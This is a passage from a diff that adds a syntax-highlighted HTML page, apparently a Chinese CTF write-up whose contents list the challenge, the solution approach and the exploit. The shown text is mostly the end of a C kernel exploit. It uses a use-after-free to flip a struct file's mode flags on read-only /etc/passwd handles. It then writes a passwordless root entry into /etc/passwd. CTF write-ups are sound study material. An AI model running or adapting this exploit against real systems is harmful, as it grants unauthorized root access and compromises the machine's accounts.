+</span><span style="color:#c0c5ce;">        }
+</span><span style="color:#c0c5ce;">    }
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">else</span><span style="color:#c0c5ce;">{
+</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[+] uaf failed</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">exit</span><span style="color:#c0c5ce;">(-</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">); 
+</span><span style="color:#c0c5ce;">    }
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">for</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> i = </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">; i &lt; </span><span style="color:#d08770;">0x200</span><span style="color:#c0c5ce;">; i++)
+</span><span style="color:#c0c5ce;">        fds[i] = </span><span style="color:#8fa1b3;">open</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">/etc/passwd</span><span style="color:#c0c5ce;">&quot;, O_RDONLY);
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(target_addr[</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">] == &#39;</span><span style="color:#a3be8c;">C</span><span style="color:#c0c5ce;">&#39;){
+</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[-] fail</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">exit</span><span style="color:#c0c5ce;">(-</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">    }
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    *(target_addr+</span><span style="color:#d08770;">0x14</span><span style="color:#c0c5ce;">) = </span><span style="color:#d08770;">0x1d</span><span style="color:#c0c5ce;">|</span><span style="color:#d08770;">0x3</span><span style="color:#c0c5ce;">; </span><span style="color:#65737e;">// f_mode FMODE_WRITE 0x3
+</span><span style="color:#c0c5ce;">    *(target_addr+</span><span style="color:#d08770;">0x16</span><span style="color:#c0c5ce;">) = </span><span style="color:#d08770;">0x4a</span><span style="color:#c0c5ce;">|</span><span style="color:#d08770;">0x4</span><span style="color:#c0c5ce;">; </span><span style="color:#65737e;">// f_mode FMODE_CAN_WRITE 0x40000
+</span><span style="color:#c0c5ce;">    *(target_addr+</span><span style="color:#d08770;">0x48</span><span style="color:#c0c5ce;">) = </span><span style="color:#d08770;">0x2</span><span style="color:#c0c5ce;">; </span><span style="color:#65737e;">// f_flags O_RDWR	0x0002
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">for </span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> i = </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">; i &lt; </span><span style="color:#d08770;">0x200</span><span style="color:#c0c5ce;">; i++){
+</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> tmpfd = fds[i];
+</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">char</span><span style="color:#c0c5ce;"> content[] = &quot;</span><span style="color:#a3be8c;">root::0:0:root:/root:/bin/sh</span><span style="color:#c0c5ce;">&quot;;
+</span><span style="color:#c0c5ce;">        ssize_t bytes = </span><span style="color:#8fa1b3;">write</span><span style="color:#c0c5ce;">(tmpfd, content, sizeof(content));
+</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">close</span><span style="color:#c0c5ce;">(tmpfd);
+</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(bytes &gt; </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">)
+</span><span style="color:#c0c5ce;">            </span><span style="color:#b48ead;">break</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">    }
+</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[+] Done</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">}
+</span></pre>
+</main>
+                <aside class="toc-sidebar">
+                    <div class="toc-sticky-container">
+                        <div class="toc-header">:: Contents ::</div>
+                        <ul class="toc-list"><li class="toc-item toc-h2" data-level="2" style="margin-left:12px"><a href="#ti-mu">题目</a></li><li class="toc-item toc-h2" data-level="2" style="margin-left:12px"><a href="#jie-ti-si-lu">解题思路</a></li><li class="toc-item toc-h2" data-level="2" style="margin-left:12px"><a href="#exp">exp</a></li></ul>
+                    </div>
+                </aside>
+            </div> 
+    <footer style="margin-top: 50px; border-top: 1px solid #333; padding-top: 20px; font-size: 0.8rem; color: #555; text-align: center;">
+        Built with Rust. <span style="color: #66ed59;">EOF</span>
+    </footer>
+    <button id="back-to-top" aria-label="Back to Top">^TOP</button>
+    <script src="script.js"></script>
+</body>
+</html>
